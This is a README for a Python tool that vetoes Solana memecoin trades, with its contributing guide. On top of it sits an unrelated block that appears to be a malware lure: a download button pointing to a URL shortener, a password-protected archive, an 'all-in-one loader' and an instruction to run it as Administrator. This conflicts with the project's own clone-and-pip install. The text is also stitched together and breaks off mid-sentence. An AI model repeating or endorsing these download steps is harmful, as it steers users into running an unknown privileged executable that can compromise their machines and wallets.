<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Why a desk that refuses

Every trading bot people publish is an optimist. It scans, it enters, it shows
a green candle. Nobody posts the trade their bot **refused**, for a boring
reason: a refusal has no chart. There is nothing to screenshot.

Finding a coin was never the hard part - thousands launch daily and half of
them move. The hard part is the hand on the button: positions closed in
seconds, adds to losers, a stop moved once and then again. Every one of those
is a decision made faster than a rule can be checked.

Hence an agent whose whole job is to say no, and a desk with no manual mode.

## Quick start

### 1. Requirements

Python 3.10 or newer. One dependency, `rich`, for the tables.

### 2. Clone and install

```bash
git clone git@github.com:jugqdc-sudo/warden-desk.git
cd warden-desk
pip install -e .
```

That puts a `warden-desk` command on your path; `python3 desk.py` works the
same way from the clone, and every example below uses the second form so it
runs with nothing installed but `rich`.

### 3. Check what you are standing on

```bash
python3 desk.py rules      # the seven rules, one panel each
python3 desk.py index      # the bundled launch snapshot
```

No keys, no wallet, no sign-up. A snapshot of the launch feed ships with the
repository, so everything below runs offline on a fresh clone.

### 4. Run the desk

```bash
python3 desk.py warden           # judge the bundled candidates
python3 desk.py warden --log     # one verdict at a time, slowly
python3 desk.py warden --table   # csv of every verdict, contracts included
python3 desk.py warden --live    # find fresh waves and rule on them
```

Every agent also runs on its own:

```bash
python3 desk.py midwife --window 6h --min-copies 8   # waves in the index
python3 desk.py graveyard --ticker MICHU             # is this ticker buried
python3 desk.py collector --top 5 --save             # build candidates
python3 desk.py clock --held 42 --pnl -4             # would this sell pass
python3 desk.py toll --profit 6 --fees 4             # is the toll winning
python3 desk.py ladder --pnl -8                      # would this add pass
python3 desk.py undertaker --held 7h                 # has the thesis expired
```

> On the bundled snapshot `--live` mostly answers `R2 wave is over`. That is
> correct, not broken: the snapshot is a historical slice and those waves
> finished being minted days ago. Point `DESK_INDEX` at a live index for
> current ones.

## The data

`data/coins.sqlite` is a snapshot of the Solana launch feed - public on-chain
facts only:

| | |
|---|---|
| launches | 12,663 |
| distinct tickers | 4,883 |
| deployer wallets | 7,963 |
| period covered | 8.5 days |
| size | 3.8 MB |

```sql
create table coins (
    mint             text primary key,
    ticker           text not null,
    deployer         text,
    born             real not null,   -- unix seconds, launch time
    launchpad        text,
    source           text,            -- social link the coin was minted from
    cap_at_index     real,
    holders_at_index integer,
    top10_at_index   real,
    indexed_at       real
);
```

`data/catch.jsonl` holds 128 candidates the collector caught, so
`python3 desk.py warden` produces verdicts on a fresh clone with no network at
all.

MIDWIFE runs entirely against that file, and reports what it threw away:

```
╭─ session ────────────────────────────────────────────────────────────────────╮
│ 4882  names    42  waves    4840  rejected    99%  refusal rate              │
│                                                                              │
│ 4620 ████████████████████████ too few copies                                 │
│  103 █                        spread over days                               │
│   93 █                        no original to buy                             │
│   24 █                        one wallet spamming                            │
╰──────────────────────────────── index covers 8.5 days of launches ───────────╯
```

A filter that does not say what it discarded is indistinguishable from a
broken one.

## Output

`data/refusals.jsonl` - one line per refusal, appended. The candidate is stored
alongside the verdict, so a refusal can be re-judged later without trusting
today's numbers:

```json
{"at": 1787816075.96651, "action": "buy", "ticker": "GOOB",
 "mint": "BgmCuReJVhJ7k8BzSvqqVovWxobRKpVrTw1cT7GZQHoA",
 "rule": "R0", "agent": "WARDEN", "code": "no counterparty",
 "reason": "2 holders - there is nobody to sell to",
 "candidate": {"cap_usd": 5617, "holders": 2, "holders_exact": true,
               "top10_share": 0.0, "silence_days": 354, "age_days": 878,
               "clones": 14, "is_original": true, "moved_pct": 0.0}}
```

`--table` - CSV of every verdict, for publishing:

```csv
verdict,ticker,rule,agent,code,holders,top10,silent_days,cap_usd,contract
DENIED,GOOB,R0,WARDEN,"no counterparty",2,0.0,354,5617,BgmCuReJ...
CLEARED,BOL,R0,WARDEN,"",756,0.229,0,39731,JDjprgWY...
```

Both carry the contract address, which is the point. A month later anyone can
look up what those coins did and tell the desk its rules were wrong.

**Exit codes.** Every agent exits `0` when it clears the order and `1` when it
refuses, so the desk composes with anything else you run:

```bash
python3 desk.py warden --table --no-save > verdicts.csv || echo "nothing cleared"
```

**The counts in this README come from the bundled snapshot** - 128 candidates
the collector had accumulated. A single day's live run is a much smaller batch,
so `--live` will print different numbers. The refusal *rate* is the stable part;
the batch size is not.

## Configuration

Everything is optional. Copy `.env.example` to `.env`, or export directly.

| Variable | What it does |
|---|---|
| `DESK_RPC` | your Solana node - the only way to read holders and top-10 live |
| `DESK_PROXY` | route requests through a proxy (`HTTPS_PROXY` also works) |
| `DESK_RULES` | path to a different rules file |
| `DESK_INDEX` | path to a different launch index |
| `DESK_CATCH` | where candidates are read from and written to |
| `DESK_REFUSALS` | where refusals are logged |
| `DESK_CANDLE_CACHE` | where the candle cache lives |

There is no key that unlocks trading, because this repository does not trade.

## Honest limitations

**The refusal rate is 98%, and that is not the market being bad.** It is two
filters pulling in opposite directions. GRAVEYARD looks for an old corpse with
a thick wave of clones on its name; WARDEN requires a live order book. The
median candidate has **5 holders and has not traded in 26 days**. So on 98% of
finds, one half of the desk tells the other half that what it found is
unsellable. That number is printed rather than tuned away, because it is the
most useful thing this project has measured.

**Holders need your own node, and without one the desk refuses.**
`getTokenLargestAccounts` is an indexed RPC call: `api.mainnet-beta.solana.com`
answers `429` every time, and `solana-rpc.publicnode.com` wants a personal
token. With no `DESK_RPC` set, holders read as unknown - and unknown is a
refusal:

```python
if candidate.holders is None:
    return self.no(
        "counterparty unknown",
        "holders could not be read - an unknown counterparty is refused "
        "like a missing one",
    )
```

Fail-closed is the character of the agent. A rule that quietly stops applying
whenever an API is down is a rule-shaped hole that opens exactly when things
are going badly.

**The bundled index is a historical slice**, roughly eight days wide. Enough to
demonstrate every rule and to run the whole chain offline; not a live feed, and
the desk says so rather than pretending.

**Two rules once cancelled each other out.** An early draft had GRAVEYARD
requiring 30+ days of silence while WARDEN refused anything silent for more
than 30 days. Nothing could satisfy both: the desk returned zero out of 128 and
looked strict rather than broken. Silence now belongs to WARDEN alone, and a
test holds it there:

```python
def test_graveyard_does_not_contradict_the_warden_on_silence():
    graveyard = rules.load()["GRAVEYARD"]
    assert "min_silence_days" not in graveyard.params
```

Any set of filters written one at a time needs a test asking whether an object
satisfying all of them can exist at all. Without it, zero output reads as
quality.

## What this is not

- **No execution layer.** Nothing here builds, signs or submits a transaction.
- **No key handling.** No wallet, no keypair, no seed. `.gitignore` blocks key
  material outright.
- **No performance claims.** No returns, no multiples, no green portfolio
  screenshots. The output is a verdict and the reasoning behind it.

For the part that submits transactions,
## Development

```
rules.json          the seven rules - the core of the project
desk.py             single entry point: desk.py <agent> [flags]

agents/
  base.py           the interface all eight implement
  graveyard.py      R1     midwife.py       R2     collector.py   R3
  clock.py          R4     toll.py          R5     ladder.py      R6
  undertaker.py     R7     warden.py        runs the seven, then the exit checks

core/
  rules.py          loads and validates rules.json, fails loudly on a typo
  feed.py           the launch index
  market.py         live quotes and exact-ticker search (public pump.fun API)
  candles.py        price history, cached on disk
  chain.py          holders and top-10 share, needs your own RPC
  ledger.py         Candidate · Position · Order · Verdict, and the refusal log
  http.py           stdlib HTTP with retries and proxy support
  term.py           panels, verdict tables, refusal cards - the whole look

data/               snapshot · caught candidates · refusal log
docs/agents.md      every agent taken apart, with code and output
tests/              43 tests, all offline
examples/           putting the warden in front of an execution layer
```

```bash
python3 -m pytest          # 43 tests, all offline
python3 -m ruff check .    # lint
python3 -m tests.check_schema   # rules.json against docs/rules.schema.json
```

CI runs all three on Python 3.10 through 3.13, and then runs every command in
this README on a fresh clone with no keys - the offline promise is checked on
every push rather than trusted.

**Adding a rule:** put it in `rules.json` with `asks`, `denies`, `params`,
`source`; subclass `Agent`, set `name` and `rule_id`, implement `check`;
register it in `BENCH` in `agents/warden.py` and `AGENTS` in `desk.py`; write a
test that it refuses the thing it exists to refuse. WARDEN enforces it on every
order from then on.

## Using it as a veto layer

The intended shape: your bot decides what it wants to do, the desk decides
whether it is allowed to. `examples/veto_before_you_buy.py` is the whole
pattern in forty lines -

```python
warden = Warden()

verdict = warden.check(order)
if verdict.denied:
    print(f"{verdict.rule_id} {verdict.code}: {verdict.reason}")
    return          # no branch here submits anyway. that is the project.

submit(order)
```

```
  BUY $SIA
    ✗ R0 no counterparty
      2 holders - there is nobody to sell to

  ADD $MICHU
    ✗ R6 averaging down
      $MICHU is at -8.0% - the desk does not add to a losing position, and
      this rule has no override
```

## Contributing

The useful contribution here is not a feature - it is evidence that a rule is
wrong. Every refusal is logged with its contract, so the way to win an argument
with the desk is a batch of refusals and what those coins did next. Details and


---

# Contributing

The useful contribution to this project is not a feature. It is evidence that
a rule is wrong.

## Arguing with a rule

Every refusal is written to `data/refusals.jsonl` with the rule, the reason and
the contract address. That makes the desk falsifiable: pick a refusal, look up
what the coin did afterwards, and bring both.

```bash
python3 desk.py warden --table > verdicts.csv
```

A good issue looks like this:

> `R0 no counterparty` refused `$X` on 2026-08-20 at 4 holders. Thirty days
> later it traded $NN,NNN of volume with NNN holders. Contract: `...`. Sample
> of 40 similar refusals attached - 12 of them did the same.

A weak issue looks like this:

> 25 holders is too strict, most good coins start with fewer.

The difference is a base rate. One coin that got away is a story; forty
refusals with what happened next is an argument, and the rules were built to
lose that argument when it is made properly.

## Adding a rule

1. Add it to `rules.json` with `id`, `agent`, `title`, `asks`, `denies`,
   `params`, `source`. `asks` must end in a question mark - a rule that cannot
   be phrased as a question is a preference.
2. Subclass `Agent` in `agents/`, set `name` and `rule_id`, implement `check`.
3. Register it in `BENCH` in `agents/warden.py` and `AGENTS` in `desk.py`.
4. Write a test that it refuses the thing it exists to refuse.
5. Check it does not contradict an existing rule. Two sensible rules can be
   jointly unsatisfiable - that happened here once and the desk returned zero
   candidates while looking strict rather than broken.

The schema in `docs/rules.schema.json` allows exactly seven rules. An eighth
means you are proposing a change to the shape of the desk, which is fine, but
say so in the pull request.

## House rules for code

- **Fail closed.** A rule that cannot read its input refuses. Use
  `self.unknown(what)` - never pass because an API was down.
- **Reasons are sentences.** `DENY_R6` tells nobody anything six months later.
  `"$MICHU is at -8.0% - the desk does not add to a losing position"` does.
- **Filters report what they dropped.** A filter that does not say what it
  threw away is indistinguishable from a broken one.
- **No execution.** No transaction building, no signing, no key handling. That
  belongs outside this repository, on purpose.
- **The desk describes, `core/term.py` draws.** Agents never print colours.

## Running the checks

```bash
pip install -e ".[dev]"
python3 -m pytest          # 43 tests, all offline
python3 -m ruff check .
python3 -m tests.check_schema
```

CI runs the same on Python 3.10 through 3.13, plus a fresh-clone run of every
command in the README with no keys and no configuration.


---

                                 Apache License
                           Version 2.0, January 2004
